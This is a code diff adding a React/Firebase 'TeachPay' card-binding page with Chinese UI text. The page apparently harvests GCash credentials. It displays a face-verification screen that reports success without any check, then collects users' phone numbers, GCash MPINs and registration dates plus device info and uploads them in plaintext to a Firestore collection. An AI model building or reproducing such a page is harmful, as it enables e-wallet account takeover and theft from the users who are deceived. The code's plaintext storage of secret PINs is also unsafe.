@@ -1,0 +1,88 @@
+// TeachPay 綁卡系統初始版本
+// 使用 React + Firebase
+// 初始功能：綁卡流程、自訂 MPIN、掃臉跳轉、資料上傳
+
+import React, { useState } from "react";
+import { initializeApp } from "firebase/app";
+import { getFirestore, collection, addDoc } from "firebase/firestore";
+import { Input } from "@/components/ui/input";
+import { Button } from "@/components/ui/button";
+import { Card, CardContent } from "@/components/ui/card";
+
+const firebaseConfig = {
+  apiKey: "YOUR_API_KEY",
+  authDomain: "YOUR_AUTH_DOMAIN",
+  projectId: "YOUR_PROJECT_ID",
+  storageBucket: "YOUR_STORAGE_BUCKET",
+  messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+  appId: "YOUR_APP_ID"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+export default function TeachPayBinder() {
+  const [phone, setPhone] = useState("");
+  const [mpin, setMpin] = useState("");
+  const [gcashDate, setGcashDate] = useState("");
+  const [deviceInfo, setDeviceInfo] = useState(navigator.userAgent);
+  const [oldMpin, setOldMpin] = useState("");
+  const [newMpin, setNewMpin] = useState("");
+  const [step, setStep] = useState("face");
+
+  const handleBind = async () => {
+    try {
+      await addDoc(collection(db, "bindings"), {
+        phone,
+        mpin,
+        gcashDate,
+        deviceInfo,
+        timestamp: new Date()
+      });
+      alert("綁定成功");
+    } catch (error) {
+      console.error("綁定失敗", error);
+      alert("綁定失敗");
+    }
+  };
+
+  const handleChangeMpin = () => {
+    if (oldMpin === mpin && newMpin.length === 4) {
+      setMpin(newMpin);
+      alert("MPIN 變更成功");
+    } else {
+      alert("請確認舊 MPIN 是否正確，且新 MPIN 為 4 位數");
+    }
+  };
+
+  if (step === "face") {
+    return (
+      <Card className="max-w-md mx-auto mt-10">
+        <CardContent className="space-y-4">
+          <h2 className="text-xl font-bold">掃臉驗證成功</h2>
+          <Button onClick={() => setStep("bind")}>前往綁卡流程</Button>
+        </CardContent>
+      </Card>
+    );
+  }
+
+  return (
+    <Card className="max-w-md mx-auto mt-10 p-4">
+      <CardContent className="space-y-4">
+        <h1 className="text-2xl font-bold">TeachPay 綁卡系統</h1>
+        <Input placeholder="手機號碼" value={phone} onChange={(e) => setPhone(e.target.value)} />
+        <Input placeholder="MPIN (4 位數)" type="password" value={mpin} onChange={(e) => setMpin(e.target.value)} />
+        <Input placeholder="GCASH 註冊日期 (YYYY-MM-DD)" value={gcashDate} onChange={(e) => setGcashDate(e.target.value)} />
+        <div className="text-sm text-gray-500">裝置資訊：{deviceInfo}</div>
+        <Button onClick={handleBind}>綁定</Button>
+
+        <hr />
+
+        <h2 className="text-lg font-semibold">變更 MPIN</h2>
+        <Input placeholder="舊 MPIN" type="password" value={oldMpin} onChange={(e) => setOldMpin(e.target.value)} />
+        <Input placeholder="新 MPIN" type="password" value={newMpin} onChange={(e) => setNewMpin(e.target.value)} />
+        <Button onClick={handleChangeMpin}>變更 MPIN</Button>
+      </CardContent>
+    </Card>
+  );
+}
